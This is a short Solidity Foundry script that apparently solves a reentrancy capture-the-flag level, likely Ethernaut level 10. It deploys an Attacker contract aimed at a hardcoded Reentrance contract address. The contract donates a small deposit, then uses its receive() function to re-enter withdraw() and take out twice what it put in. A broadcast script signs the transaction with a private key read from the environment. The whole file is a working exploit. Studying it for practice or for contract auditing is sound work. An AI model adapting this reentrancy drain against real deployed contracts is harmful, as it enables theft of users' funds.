// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {Reentrance} from "../src/level10ReEntrancy.sol";

contract Attacker {
    Reentrance reentrance =
        Reentrance(payable(0xAfc06632f4a2B2B38274D7Bb3f13Aa8F732A66ac));

    constructor() public payable {
        reentrance.donate{value: 0.001 ether}(address(this));
    }

    function withdraw() external {
        reentrance.withdraw(0.001 ether);
        (bool result, ) = msg.sender.call{value: 0.002 ether}("");
        require(result);
    }

    receive() external payable {
        reentrance.withdraw(0.001 ether);
    }
}

contract Level10Solution is Script {
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        Attacker attacker = new Attacker{value: 0.001 ether}();
        attacker.withdraw();
        vm.stopBroadcast();
    }
}
